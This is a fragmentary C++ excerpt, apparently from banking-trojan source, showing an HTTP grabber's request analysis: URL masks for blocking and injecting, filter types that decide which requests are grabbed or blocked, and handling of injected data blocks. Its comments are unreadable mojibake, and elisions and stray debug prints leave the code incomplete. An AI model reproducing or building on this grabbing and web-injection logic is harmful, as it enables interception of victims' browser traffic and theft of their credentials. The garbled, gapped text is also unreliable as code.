...
{
  CRITICAL_SECTION cs;   //����. ������ ��� ������� � ����������.
  LPSTR urlMaskForBlock; //����� URL, �� ������� ����� ������������ ������ (== HttpInject::HEADER.urlMask).
  LPSTR blockOnUrl;      //����� URL, ��-�� ������� ����� ������������ ������ (== HttpInject::HEADER.blockOnUrl). 
}blockInjectInfo;
...
DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
{
  ...
  DWORD retVal = 0;
  signed char writeReport = -1;/*-1 - �� ���������, 0 - �� ������, 1 - ������������� ������*/;
  ...
  if(requestData->dynamicConfig != NULL)
  {
    ...
    {      
      ...
      { 
        ...
        switch(curFilter[0])
        {
          case '!': filterType = 1; break; //�� ������ � �����,
          case '@': filterType = 2; break; //��������.
          case '-': filterType = 3; break; //���������� ���� ����� �������� � URL, � ���������� �������.
          case '^': filterType = 4; break; //���������� �������.
...
OutputDebugStringA("2");
    ...
    while(curBlock < endBlock)
    {
      ...
      curBlock = (LPBYTE)blockNew + blockNew->size; //��������� �������.
...
OutputDebugStringA("8");
      ...
      DWORD blockNewDataSize = blockNew->size - sizeof(HttpInject::INJECTBLOCK); //������ ���������� ������.
      DWORD matchedDataSize  = offsetEnd - offsetBegin;                          //������ ������� ������.
      //������.
...
# endif
  ...
  {
    Core::initHttpUserAgent(); //����� ������� �����, �.�. ����� � ������ ������ �������� � deadlock.
